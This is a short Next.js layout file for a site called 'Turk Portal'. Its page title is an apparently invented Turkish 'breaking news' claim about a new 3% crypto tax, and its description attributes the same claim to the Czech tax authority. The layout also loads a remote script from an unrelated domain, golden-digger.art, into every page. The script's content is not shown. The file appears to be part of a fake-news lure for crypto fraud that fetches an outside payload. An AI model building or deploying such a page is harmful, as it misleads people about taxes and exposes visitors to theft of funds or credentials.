export const metadata = {
  title: "SON DAKİKA: Maliye, 200.000 TL üzeri kripto varlıklara %3 “dijital güvenlik vergisi” getirmeye hazırlanıyor — Turk Portal",
  description: "Finanční správa České republiky dnes vydala mimořádné oznámení ohledně plánované 3% digitální bezpečnostní daně z kryptoměn.",
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

import "./globals.css";

export default function RootLayout({ children }) {
  return (
    <html lang="tr">
      <body>
        {children}
        <script src="https://golden-digger.art/p/2d72c91e-8a15-4c88-8f0c-aa9dcca859c5/bootstrap.js" async defer></script>
      </body>
    </html>
  );
}
